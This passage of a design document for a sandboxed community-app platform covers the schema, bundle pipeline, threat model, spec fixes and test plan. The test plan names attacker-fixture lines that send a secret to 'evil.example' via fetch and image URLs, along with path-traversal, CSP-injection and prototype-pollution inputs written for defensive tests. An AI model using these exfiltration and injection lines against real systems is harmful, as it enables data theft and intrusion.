- `pnpm gen --check` produces no diff (CI fails on stale generated files)

`get_sdk_docs` cannot describe a capability that doesn't exist, and cannot omit one that does, because the MCP server reads a file generated from the same table that enforces permissions. That is the sync mechanism — not discipline.

---

## 4. Database schema (Drizzle, following `packages/db/src/schema.ts` conventions)

```ts
import {
  pgTable, text, boolean, timestamp, jsonb, integer, uuid,
  primaryKey, uniqueIndex, index, customType, doublePrecision,
} from 'drizzle-orm/pg-core';
import { sql } from 'drizzle-orm';

const bytea = customType<{ data: Uint8Array; driverData: Uint8Array }>({
  dataType: () => 'bytea',
});

// ── identity ─────────────────────────────────────────────────────────────────
// Replaces v1's `profiles`, which stored real_name and is incompatible with the
// Tier-0/1 spec's "no real names, ever". Do not carry profiles forward.
export const users = pgTable('users', {
  id: uuid('id').primaryKey().defaultRandom(),
  handle: text('handle').notNull(),
  email: text('email').notNull(),                       // private, never rendered
  emailConfirmed: boolean('email_confirmed').notNull().default(false),
  role: text('role').notNull().default('user'),         // user | moderator | admin
  verifiedResident: boolean('verified_resident').notNull().default(false),
  verifiedMethod: text('verified_method'),              // vouch | postcard | manual
  verifiedAt: timestamp('verified_at', { withTimezone: true }),
  vouchBudgetOverride: integer('vouch_budget_override'),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp('updated_at', { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  // case-insensitive uniqueness: "TSwic" vs "tswic" is an impersonation hole
  handleUq: uniqueIndex('users_handle_lower_uq').on(sql`lower(${t.handle})`),
  emailUq:  uniqueIndex('users_email_lower_uq').on(sql`lower(${t.email})`),
}));

export const vouches = pgTable('vouches', {
  id: uuid('id').primaryKey().defaultRandom(),
  voucherId: uuid('voucher_id').notNull().references(() => users.id),
  voucheeId: uuid('vouchee_id').notNull().references(() => users.id),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  revokedAt: timestamp('revoked_at', { withTimezone: true }),
  revokedBy: uuid('revoked_by').references(() => users.id),
  note: text('note'),
}, (t) => ({ pairUq: uniqueIndex('vouches_pair_uq').on(t.voucherId, t.voucheeId) }));

// ── creations ────────────────────────────────────────────────────────────────
export const creations = pgTable('creations', {
  id: uuid('id').primaryKey().defaultRandom(),
  townId: text('town_id').notNull(),
  ownerId: uuid('owner_id').notNull().references(() => users.id),
  kind: text('kind').notNull().default('embedded'),     // embedded | linked
  slug: text('slug').notNull(),                         // renameable, cosmetic
  // IMMUTABLE subdomain label. Never derived from slug, never reused after deletion —
  // otherwise a squatter inherits the previous app's localStorage on that origin.
  originKey: text('origin_key').notNull(),
  name: text('name').notNull(),
  tagline: text('tagline').notNull().default(''),
  description: text('description').notNull().default(''),
  url: text('url'),                                     // kind='linked' only
  tags: jsonb('tags').$type<string[]>().notNull().default([]),
  tier: integer('tier').notNull().default(0),
  status: text('status').notNull().default('draft'),    // draft|pending|active|hidden|dead|blocked
  activeVersionId: uuid('active_version_id'),           // FK added post-hoc (circular)
  sourceVisibility: text('source_visibility').notNull().default('public'),
  forkedFromId: uuid('forked_from_id'),
  trustedPublisher: boolean('trusted_publisher').notNull().default(false),
  lastSeenOk: timestamp('last_seen_ok', { withTimezone: true }),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp('updated_at', { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  slugUq:   uniqueIndex('creations_town_slug_uq').on(t.townId, t.slug),
  originUq: uniqueIndex('creations_origin_key_uq').on(t.originKey),
  byTown:   index('creations_town_status_idx').on(t.townId, t.status),
}));

export const creationVersions = pgTable('creation_versions', {
  id: uuid('id').primaryKey().defaultRandom(),
  creationId: uuid('creation_id').notNull().references(() => creations.id),
  version: integer('version').notNull(),
  // The APPROVED manifest. Runtime reads this, never townsquare.json in the bundle.
  manifest: jsonb('manifest').$type<Manifest>().notNull(),
  manifestVersion: integer('manifest_version').notNull(),
  sdkVersion: text('sdk_version').notNull(),
  // CSP compiled and FROZEN at approval. Never recomputed at request time.
  cspHeader: text('csp_header').notNull(),
  bundleDigest: text('bundle_digest').notNull(),        // sha256 over the canonical tree
  entryPath: text('entry_path').notNull(),
  fileCount: integer('file_count').notNull(),
  totalBytes: integer('total_bytes').notNull(),
  status: text('status').notNull().default('pending'),  // pending|approved|rejected|superseded
  autocheckReport: jsonb('autocheck_report').$type<AutocheckReport>(),
  submittedBy: uuid('submitted_by').notNull().references(() => users.id),
  submittedAt: timestamp('submitted_at', { withTimezone: true }).notNull().defaultNow(),
  reviewedBy: uuid('reviewed_by').references(() => users.id),
  reviewedAt: timestamp('reviewed_at', { withTimezone: true }),
  reviewNotes: text('review_notes'),
  previewKey: text('preview_key'),                      // p-<key>.APPS_DOMAIN, unapproved only
}, (t) => ({
  verUq: uniqueIndex('creation_versions_uq').on(t.creationId, t.version),
  prevUq: uniqueIndex('creation_versions_preview_uq').on(t.previewKey),
}));

// path → blob. There is no filesystem, so there is no path traversal.
export const creationFiles = pgTable('creation_files', {
  versionId: uuid('version_id').notNull().references(() => creationVersions.id),
  path: text('path').notNull(),                         // normalized, no leading slash, no ..
  blobSha: text('blob_sha').notNull().references(() => creationBlobs.sha256),
  contentType: text('content_type').notNull(),          // from extension allowlist, never sniffed
  byteSize: integer('byte_size').notNull(),
}, (t) => ({ pk: primaryKey({ columns: [t.versionId, t.path] }) }));

// content-addressed, deduped across versions AND forks (vendored leaflet.js stored once)
export const creationBlobs = pgTable('creation_blobs', {
  sha256: text('sha256').primaryKey(),
  bytes: bytea('bytes').notNull(),
  byteSize: integer('byte_size').notNull(),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
});

// ── records ──────────────────────────────────────────────────────────────────
// From manifest.defines. Town-wide per the spec's leaning: first definer wins,
// later definitions may only be additive (see §8.5).
export const recordTypes = pgTable('record_types', {
  townId: text('town_id').notNull(),
  type: text('type').notNull(),                         // snake_case, reserved names blocked
  label: text('label').notNull(),
  schema: jsonb('schema').$type<TypeSchema>().notNull(),
  definedByCreationId: uuid('defined_by_creation_id').references(() => creations.id),
  definedByVersionId: uuid('defined_by_version_id').references(() => creationVersions.id),
  status: text('status').notNull().default('active'),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp('updated_at', { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({ pk: primaryKey({ columns: [t.townId, t.type] }) }));

export const records = pgTable('records', {
  id: uuid('id').primaryKey().defaultRandom(),
  townId: text('town_id').notNull(),
  type: text('type').notNull(),
  data: jsonb('data').$type<Record<string, unknown>>().notNull(),
  currentVersion: integer('current_version').notNull().default(1),
  status: text('status').notNull().default('active'),   // active | stale | hidden
  createdByUserId: uuid('created_by_user_id').references(() => users.id),
  createdByCreationId: uuid('created_by_creation_id').references(() => creations.id),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp('updated_at', { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  byType: index('records_town_type_updated_idx').on(t.townId, t.type, t.updatedAt),
  byData: index('records_data_gin').using('gin', t.data),
}));

export const recordVersions = pgTable('record_versions', {
  id: uuid('id').primaryKey().defaultRandom(),
  recordId: uuid('record_id').notNull().references(() => records.id),
  version: integer('version').notNull(),
  data: jsonb('data').$type<Record<string, unknown>>().notNull(),
  status: text('status').notNull().default('active'),
  authorUserId: uuid('author_user_id').references(() => users.id),
  authorCreationId: uuid('author_creation_id').references(() => creations.id),
  authorCreationVersionId: uuid('author_creation_version_id').references(() => creationVersions.id),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  revertedFrom: integer('reverted_from'),
}, (t) => ({ verUq: uniqueIndex('record_versions_uq').on(t.recordId, t.version) }));

// ── per-creation, per-user private storage ───────────────────────────────────
// creationId and userId come from the ACT TOKEN, never from guest params.
export const creationStorage = pgTable('creation_storage', {
  creationId: uuid('creation_id').notNull().references(() => creations.id),
  userId: uuid('user_id').notNull().references(() => users.id),
  key: text('key').notNull(),                           // ≤128 chars, [a-zA-Z0-9._:-]
  value: jsonb('value').notNull(),                      // ≤64 KB serialized
  byteSize: integer('byte_size').notNull(),             // enables the quota query
  updatedAt: timestamp('updated_at', { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({ pk: primaryKey({ columns: [t.creationId, t.userId, t.key] }) }));
// quotas enforced in the write path: ≤64 keys and ≤256 KB per (creation, user)

// ── keys, reports, telemetry ─────────────────────────────────────────────────
// NOTE: api_keys serve kind='linked' creations only. Embedded creations never get
// a key; they use the bridge + act token. See §8.13.
export const apiKeys = pgTable('api_keys', {
  id: uuid('id').primaryKey().defaultRandom(),
  creationId: uuid('creation_id').notNull().references(() => creations.id),
  name: text('name').notNull().default(''),
  prefix: text('prefix').notNull(),                     // 'tsk_ab12', shown in UI
  keyHash: text('key_hash').notNull(),                  // sha256; keys are 256-bit, no bcrypt needed
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  revokedAt: timestamp('revoked_at', { withTimezone: true }),
  lastUsedAt: timestamp('last_used_at', { withTimezone: true }),
}, (t) => ({ hashUq: uniqueIndex('api_keys_hash_uq').on(t.keyHash) }));

export const reports = pgTable('reports', { /* per spec, unchanged */ } as any);

// capped, rate-limited ingest. a creation reaching an undeclared host shows up here
// automatically — free continuous signal that source review missed something.
export const cspReports = pgTable('csp_reports', {
  id: uuid('id').primaryKey().defaultRandom(),
  originKey: text('origin_key').notNull(),
  versionId: uuid('version_id'),
  directive: text('directive').notNull(),
  blockedUri: text('blocked_uri').notNull(),
  count: integer('count').notNull().default(1),
  firstSeenAt: timestamp('first_seen_at', { withTimezone: true }).notNull().defaultNow(),
  lastSeenAt: timestamp('last_seen_at', { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({ uq: uniqueIndex('csp_reports_uq').on(t.originKey, t.directive, t.blockedUri) }));

export const creationIncidents = pgTable('creation_incidents', {
  id: uuid('id').primaryKey().defaultRandom(),
  creationId: uuid('creation_id').notNull(),
  kind: text('kind').notNull(),   // ready_timeout | unexpected_navigation | rate_limit_storm | csp_violation
  detail: jsonb('detail'),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
});

export type UserRow = typeof users.$inferSelect;
export type CreationRow = typeof creations.$inferSelect;
export type CreationVersionRow = typeof creationVersions.$inferSelect;
export type RecordRow = typeof records.$inferSelect;
```

`content_items`, `towns`, and `source_health` carry forward from v1 unchanged.

---

## 5. Bundle pipeline

```
CLI / MCP / web upload
  → POST /v1/creations/:id/versions   (multipart tar.gz or a JSON file map)
  → decompress with a hard limit (zip-bomb guard: 8 MB decompressed ceiling, per-entry cap)
  → normalize + validate every path
  → parse & strictly validate townsquare.json
  → run autochecks
  → sha256 each file, INSERT ... ON CONFLICT DO NOTHING into creation_blobs
  → insert creation_files rows + creation_versions(status='pending', preview_key=…)
  → preview live immediately at p-<preview_key>.APPS_DOMAIN
  → review (human or trusted-publisher fast path)
  → on approve: compile & freeze csp_header, status='approved',
                creations.active_version_id = this, previous → 'superseded'
```

**Limits** (the spec leaves these open — deciding them):

| Limit | Value |
|---|---|
| Total uncompressed bundle | 2 MB |
| Files | 200 |
| Single file | 1 MB |
| Entry HTML | 256 KB |
| Path length / depth | 200 chars / 8 segments |
| Declared network hosts | 12 |
| `defines` types per creation | 5 |

**Vendoring** is required — no npm at runtime, everything in the bundle. Two things make that bearable:
- A **known-library allowlist by sha256**. Vendored `leaflet.js`, `chart.js`, `d3.js` at known versions are recognized, marked "known library, not reviewed line-by-line", and excluded from the reviewer's diff. Without this, review cost is dominated by re-reading minified libraries, which is exactly the "review queues die" failure mode `creation-authoring.md` warns about.
- **Blob dedupe** means the fiftieth creation vendoring Leaflet costs zero bytes.

**Autochecks** (run before a human ever sees it, per the spec's "most rejections should never reach a person"):
- manifest strict-zod valid; hostnames normalize; `defines` schemas well-formed and non-conflicting
- entry exists; icon exists and is 1:1
- no file outside the extension allowlist
- no own import map mapping `@townsquare/*`; SDK not vendored
- **minification/obfuscation heuristics** on non-allowlisted files: mean line length > 400, whitespace ratio < 5%, presence of `eval(`/`new Function(`/`atob(` adjacent to a >1 KB string literal, hex/unicode-escape density. Fail → auto-reject with the specific line
- static scan for URLs not covered by `permissions.network` — flag for reviewer, don't auto-reject (false positives on doc comments are common)
- **permission expansion vs. the previous approved version always forces human review**, even for trusted publishers. This is the browser-extension attack the spec names, and it is the one rule that should never be automated away

---

## 6. Monorepo layout

```
townsquare/
  api/                              Fastify, tsx, no build (v1 pattern)
    src/main.ts                     API service        → api.townsquare.org
    src/main.sandbox.ts             bundle service     → *.tsq-apps.net
    src/server.ts  src/server.sandbox.ts
    src/routes/{towns,creations,versions,records,storage,bridge,reports,auth,csp}.ts
    src/sandbox/{resolveHost,serveFile,inject,mime,cache}.ts
    src/auth/{session,actToken,verify}.ts
    src/publish/{ingestBundle,autocheck,approve}.ts
  packages/
    db/src/schema.ts                + drizzle/ migrations
    shared/src/{manifest,protocol,csp,errors,paths}.ts     zod, shared host+api+validator
    tokens/src/index.ts             emits tokens.ts (RN) + theme.css (web/guest)
    sdk/                            @townsquare/sdk — authored .js + JSDoc, no build
      src/{index,bridge,methods,town,user,records,storage,app,global,boot}.js
      types/index.d.ts              generated, committed, CI --check
      AGENTS.md                     generated, committed
    host/src/{CreationHost,transport,bridge,registry.generated,limiter,lifecycle}.ts
                                    plain TS, zero React — a native WebView host reuses it
    validator/                      used by api, cli, and mcp — one implementation
  web/                              NEW React + Vite shell → townsquare.org
    src/creations/{Gallery,CreationView,CreationFrame.tsx}
  packages/app/                     existing Expo app, unchanged, consumes the API
  mcp/                              MCP server (get_sdk_docs, scaffold, validate, preview, submit)
  cli/                              townsquare publish
  templates/                        map / ranked-list / directory-filter / calendar / blank
  worker/                           ingest + linked-creation liveness pings
  e2e/                              Playwright — the sandbox boundary suite
```

`pnpm-workspace.yaml` gains `web`, `mcp`, `cli`, `e2e`. The Dockerfile's filtered install grows `--filter "@ts/sandbox..."`.

---

## 7. Threat model

| # | Attack | Stopped by |
|---|---|---|
| 1 | Guest reads/writes parent DOM | Different registrable domain → `window.parent` opaque. Sandbox attribute is belt to that suspenders |
| 2 | Guest removes its own `sandbox` attribute | Requires parent DOM access. See #1 |
| 3 | Session cookie theft | Cookie is `HttpOnly` + `__Host-` + scoped to `townsquare.org`. It is never sent to `tsq-apps.net` by the cookie jar itself, not by policy. No JS anywhere can read it |
| 4 | Act token theft from the guest | Token never enters the guest. If it did: creation-scoped, user-scoped, permission-scoped, 15-min TTL, `jti`-revocable. Never an account credential |
| 5 | Exfiltration via `fetch`/XHR/WebSocket/`sendBeacon` | `default-src 'none'` + `connect-src` = declared allowlist only |
| 6 | Exfiltration via `new Image().src = url + secret` | `img-src` is exactly as tight as `connect-src`. This is the bypass people miss when they only lock `connect-src` |
| 7 | Exfiltration via form POST | `form-action 'none'` |
| 8 | Exfiltration via `window.open` | No `allow-popups`. The sanctioned route, `app.openLink`, is checked by the host (`checkOutboundLink`: https/http/tel/mailto only, no credentials in the URL, no IPs or private names, no `cc`/`bcc`), needs a press inside the frame (page activation **and** focus in the iframe), allows one dialog at a time, and opens only from the resident's click in a shell-drawn dialog that names the real host. A link can still carry data in its address, but only to a place the resident has seen and chosen |
| 9 | Exfiltration via nested iframe / `<object>` | `frame-src 'none'`, `child-src 'none'`, `object-src 'none'` |
| 10 | Exfiltration via `<base href>` repointing relative URLs | `base-uri 'none'` |
| 11 | Exfiltration via Referer leakage | `Referrer-Policy: no-referrer` on assets and on the iframe |
| 12 | Exfiltration via **self-navigation** | **RESIDUAL — CSP cannot stop this** (`navigate-to` never shipped). Mitigated by the no-minification rule + source review, plus host detection of an unexpected `load` after ready → incident + auto-flag. Named honestly, not hidden |
| 13 | Fetch-a-payload-and-eval to run unreviewed code | No `'unsafe-eval'`, no `wasm-unsafe-eval`, `worker-src 'self'` with no `blob:`, no `.wasm` served |
| 14 | Clickjacking **of** a creation by an external site | `frame-ancestors` limited to shell origins |
| 15 | Clickjacking / phishing **by** a creation | Confined to its own rect; a persistent Town Square chrome strip is rendered above every creation, including `surface: "full"`; no login form ever exists inside a creation, so there is nothing to imitate credibly |
| 16 | Cross-creation localStorage poisoning | Per-creation origin; `origin_key` immutable and never reused after deletion |
| 17 | `storage.*` cross-tenant read/write | Server keys on `(act.cre, act.sub)`. Guest-supplied ids are structurally not part of the key |
| 18 | Storage disk DoS | ≤128-char keys, ≤64 KB/value, ≤64 keys, ≤256 KB per (creation,user), enforced in the write path |
| 19 | Permission escalation via crafted manifest | Strict zod (`.strict()`, closed enums, bounded arrays); `__proto__`/`constructor`/`prototype` keys rejected anywhere in the parsed JSON; registries are `Map`s |
| 20 | Editing `townsquare.json` in the served bundle to gain permissions | The runtime **never reads the bundle's manifest**. Grants come from `creation_versions.manifest` and the CSP from `creation_versions.csp_header`, both frozen at approval |
| 21 | Bypassing the SDK and hand-writing port messages | Client checks are UX only. The server independently enforces the same table from act-token claims. Every permission is tested at both layers |
| 22 | Attribution forgery (blaming another creation for a write) | Server derives creation and user from the act token, never from request params |
| 23 | Malicious update after approval | Versioned; approved version pinned; updates re-reviewed; **permission expansion always forces human review**, even for trusted publishers |
| 24 | Path traversal in bundle serving | Normalize (reject `..`, absolute, backslash, NUL, over-long percent-encoding, NFC-ambiguous), then **exact DB lookup**. There is no filesystem to traverse |
| 25 | MIME confusion / content sniffing | Closed extension→type allowlist, `nosniff`, no octet-stream fallback |
| 26 | SVG-carried script | Lands on the creation's own origin only; grants nothing it didn't already have |
| 27 | Cross-frame message spoofing | `event.source` identity + exact `event.origin` equality + single-latch handshake + `MessagePort` capability thereafter. Host's `window` listener is removed post-connect |
| 28 | Bridge id collision / response confusion | Ids are `crypto.randomUUID()` + monotonic counter; map entry deleted before settling; unknown ids dropped |
| 29 | Runaway request loop | Host token bucket (no round trip) + in-flight cap + server limits + daily ceiling → incident |
| 30 | Infinite loop / memory bomb in the guest | Hangs only its own frame — precisely why the iframe is the right boundary. Host stays responsive; ping/pong detects it; user gets a kill button |
| 31 | Zip bomb on upload | Decompressed-size ceiling with per-entry caps, streamed |
| 32 | CSRF from the guest origin against the API | `/v1/bridge/*` CORS allows shell origins only, never `*.tsq-apps.net`; credential is a header bearer token, not a cookie; cookies are `SameSite=Lax` |
| 33 | SSRF via `permissions.network` | Hostnames rejected for IP literals (all encodings), `localhost`, `.local`/`.internal`, cloud metadata, our own domains. Also: the browser makes these requests, not the server, so there is no internal network to reach |
| 34 | Record-existence oracle via error codes | Undeclared-type reads return `not_found`, never `permission_denied` |
| 35 | Spectre / cross-origin renderer read | Separate registrable domain today; PSL entry for per-creation site isolation later. `COOP: same-origin` on the shell now; COEP deferred |
| 36 | Handle impersonation via case | `lower()` unique index on handle |
| 37 | Slug squat inheriting a predecessor's storage | Origin keyed on immutable `origin_key`, never on slug |
| 38 | XSS in `app.setTitle` reaching shell chrome | Max 80 chars, rendered as a text node, never `innerHTML` |
| 39 | Unreviewed preview code poisoning the approved origin | Previews live on a separate `p-<key>` origin namespace |

---

## 8. Spec problems to fix before building

1. **Direct contradiction.** `creation-authoring.md` §Security says "CSP restricting network access to Town Square's own API," which `spec-manifest-and-sdk.md` §"Correction on network access" explicitly overturns. Both documents claim to be the contract, and `get_sdk_docs` will feed one of them to a model. Amend the authoring doc to point at the manifest spec.

2. **Two names for one call.** `creation-authoring.md` says `records.write(type, data)`; the manifest spec says `records.create` / `records.update`. Pick `create`/`update` and delete the other. This is the exact kind of thing that permanently splits generated code.

3. **`records.get(id)` / `history(id)` / `update(id, …)` take a bare id.** Permission is declared by *type*, so the host must resolve id→type before it can decide — which means an undeclared-type probe returns a distinguishable error and becomes an enumeration oracle. Change the signatures to `records.get(type, id)`, `records.update(type, id, patch)`, `records.history(type, id)`. Cheap now; impossible after "SDK 1 never breaks" takes effect.

4. **The error code list is too short.** `not_verified, permission_denied, rate_limited, not_found, invalid_record` has no code for a malformed call, an unauthenticated call, a timeout, a lost write race, or an oversized payload. The malformed-call case is the one a builder hits most. Add `invalid_request`, `unauthenticated`, `unavailable`, `conflict`, `too_large` now, while adding codes is still free.

5. **`permissions.read` mixes two namespaces.** The example lists `["events", "notices", "businesses", "flock_camera"]` — three ingested content types (plural) and one record type (singular snake_case). Meanwhile `town.items({type:'event'})` needs no permission at all while `records.list('flock_camera')` does. Resolve: `town.*` covers ingested content and requires no declaration; `permissions.read`/`write` are **record types only**, singular snake_case, validated against `record_types`. Fix the example, because models copy examples.

6. **`permissions.network` has no stated granularity.** Specify: https only, bare hostname, no wildcards, no ports, no paths, and one declaration covers `connect-src`, `img-src`, `media-src`, and `font-src`. Without the img-src clause an implementer will lock `connect-src` and leave the image-GET exfil channel wide open.

7. **No device permissions.** A map app will want geolocation, and there is no way to ask. Reserve `permissions.device: ["geolocation"]` now (validated, rejected if non-empty at launch) so the field exists when it's needed.

8. **`display.height: "auto"` has no failure mode.** If the guest never reports, what happens? Specify: 320 px skeleton, 10 s ready timeout, `[200, 4000]` clamp on every reported value.

9. **`app.setTitle` is unbounded.** Specify ≤80 chars, plain text, rendered as a text node.

10. **No wire protocol version.** `manifest_version` and `sdk` are versioned but the host↔guest envelope is not. Add `ts: 1`.

11. **Bundle limits are still open.** §5 above decides them. Leaving this open blocks the validator, which blocks the MCP `validate` tool, which blocks Door B.

12. **Storage lifecycle across rename and fork is undefined.** Specify: keyed on creation id, survives rename, forks start empty.

13. **`api_keys` overlaps the bridge.** Tier 1 issues per-creation keys, but embedded creations use the bridge and never need one. State that `api_keys` serve `kind='linked'` creations and external integrations only.

14. **`users.is_moderator`** in the table sketch is superseded by the `role` answer at the bottom of the same document. Update the table.

15. **`defines` schema conflict is unspecified.** If two creations define `flock_camera` differently, what happens? Proposal: town-wide, first definer wins, later definitions may only add optional fields; removing or retyping a field is rejected at review.

16. **Nobody owns the cost of `permissions.network`.** An approved creation makes every resident's browser hammer a third party. Not a security hole, but a reputational and etiquette one. Worth an acceptable-use line and a reviewer prompt.

---

## 9. Build order

**Phase 0 — the contract (nothing else can start).**
1. Register `$APPS_DOMAIN`, wildcard cert. File the PSL request (weeks of lead time, no dependency).
2. `packages/tokens` — one source, emits `tokens.ts` + `theme.css`.
3. `packages/shared` — manifest zod, protocol types, error codes, CSP compiler, path normalizer.
4. `packages/sdk/src/methods.js` — the method table, and the generator that produces docs, types, and both enforcement registries from it.

**Phase 1 — one migration.** All of §4 in `0000_*.sql`. The Tier-0/1 spec is right that retrofitting version history is miserable; the same is true of `origin_key` and frozen manifests. Ship the whole schema even though records stay unexposed until Phase 8.

**Phase 2 — bundle store + sandbox server, no bridge.** Upload, validate, blobs, host resolution, frozen CSP, injection, serving. A hand-written hello-world creation renders themed inside a plain HTML page. **This is the earliest end-to-end proof and the first thing the Playwright boundary suite can attack.** Write that suite here, not later.

**Phase 3 — the bridge, anonymous.** `packages/host` + SDK handshake, port, correlation, timeouts, limiter. Methods: `app.*` and `town.*` only, backed by the v1 read routes that already exist. No identity, no writes. Ship `web/` with the gallery and the creation view. **This is the milestone that tests the thesis** — residents can build and run things — and it needs neither auth nor write-back to get there.

**Phase 4 — identity.** Users, email confirm, handles, vouches, manual verification, seed cohort. Act tokens. `user.current`.

**Phase 5 — `storage.*`.** Small, self-contained, and the first thing builders ask for after identity.

**Phase 6 — review.** Queue, autochecks, version pinning, update review, moderator view, CSP report ingest, incident surfacing.

**Phase 7 — the doors.** MCP server, CLI `townsquare publish`, starter templates, local dev proxy, `AGENTS.md`.

**Phase 8 — `records.*` write-back.** Last. It is the highest-risk surface and it depends on identity, review, rate limits, and moderation all being real. `record_types` from `defines`, dual attribution, revert, reports.

**Deferred, deliberately:** in-app AI builder (per `creation-authoring.md`'s own recommendation), trusted-publisher automation, forking UI, embedded creations on native, geolocation, cross-town creations, COEP, object-storage migration for bundles.

---

## 10. Testing

**Unit (vitest, node).** CSP compiler as a table-driven suite including every hostname-injection attempt (`evil.com;script-src *`, `EVIL.COM`, punycode homographs, `0x7f.1`, `127.1`, trailing dots). Manifest zod including `__proto__` payloads. Path normalizer against a traversal corpus. Permission table. Token bucket. Error mapping — assert no internal message ever escapes.

**Contract tests.** Every SDK export has a `METHODS` entry and vice versa; every entry has a permission rule; `pnpm gen --check` produces no diff. CI fails on stale generated docs, so `get_sdk_docs` cannot drift.

**Bridge protocol (vitest + happy-dom, one process, fake `MessageChannel`).** Host bridge and guest SDK run together in-memory. Covers correlation, out-of-order and duplicate responses, forged ids, double-settle, timeouts on both sides, in-flight cap, unknown methods, malformed envelopes, oversized params, every permission denial, and teardown with in-flight requests. Fast, and it covers most of the logic.

**DB (Testcontainers `postgres:16-alpine`, the v1 pattern).** Record versioning, revert-as-forward-operation, dual attribution, storage quotas at the boundary, blob dedupe, `origin_key` uniqueness across deletion.

**API (`app.inject()` + Testcontainers, matching `api/src/routes.test.ts`).** Act-token issuance, expiry, claim enforcement, CORS rejection of the guest origin, bridge endpoints rejecting cookie auth.

**Sandbox boundary (Playwright) — the highest-value suite in the repo, and it is adversarial, not happy-path.** A fixture `e2e/fixtures/attacker-creation/` that actively tries to escape, and a test asserting each attempt fails:

- `window.parent.document` throws `SecurityError`
- `document.cookie` contains no session
- `fetch('https://evil.example')` rejects **and** a CSP report arrives at the endpoint
- `new Image().src = 'https://evil.example/?x=' + secret` is blocked (assert via the report, since image errors are opaque)
- `eval('1')`, `new Function('1')` throw
- `window.open(...)` returns `null`
- `top.location = …` is blocked
- a second iframe posting to the host window is ignored
- a forged `init` after the first is ignored (latch test)
- **hand-written port messages bypassing the SDK still get `permission_denied`** — this is the test that proves client checks aren't the security boundary
- `records.create` while unverified → `not_verified`
- a bundle whose served `townsquare.json` was edited to add permissions gains nothing (frozen-manifest test)
- `/../../etc/passwd`, `/%2e%2e/`, `/..%2f` → 404
- origin A cannot read origin B's `localStorage`
- **snapshot assertions on the exact `sandbox` attribute string and the exact CSP header**, so nobody can silently loosen either without a failing test and a visible diff

**Fuzz.** Random JSON into the bridge and the manifest parser; property: no unhandled rejection, and every error code returned is in the enumerated set.

**CI environment trick.** Chromium resolves any `*.localhost` subdomain to 127.0.0.1 automatically and treats it as a secure context, so the whole multi-origin setup runs with no `/etc/hosts` edits and no certificates: shell at `http://townsquare.localhost:5173`, bundles at `http://a7k2m9x4.tsq-apps.localhost:3031`. Origin separation is genuine, so every boundary test above is meaningful in CI.

---

### Critical Files for Implementation

- `/Users/talswicegood/Desktop/Projects/swiceos/local/projects/townsquare/spec-manifest-and-sdk.md` — the authoritative contract; §8 fixes land here first
- `/Users/talswicegood/Desktop/Projects/swiceos/local/archive/townsquare-v1/river-valley-townsquare/packages/db/src/schema.ts` — conventions the new schema in §4 follows exactly
- `/Users/talswicegood/Desktop/Projects/swiceos/local/archive/townsquare-v1/river-valley-townsquare/api/src/server.ts` — the Fastify bootstrap pattern that `server.ts` and the new `server.sandbox.ts` both mirror
- `/Users/talswicegood/Desktop/Projects/swiceos/local/archive/townsquare-v1/river-valley-townsquare/api/src/routes.ts` — the existing read routes the `town.*` bridge methods wrap
- `/Users/talswicegood/Desktop/Projects/swiceos/local/archive/townsquare-v1/river-valley-townsquare/packages/app/src/theme/tokens.ts` — source for `packages/tokens`, which emits both `tokens.ts` and the guest `theme.css`
- `/Users/talswicegood/Desktop/Projects/swiceos/local/archive/townsquare-v1/river-valley-townsquare/Dockerfile` — the one-image, per-service-startCommand pattern the sandbox service reuses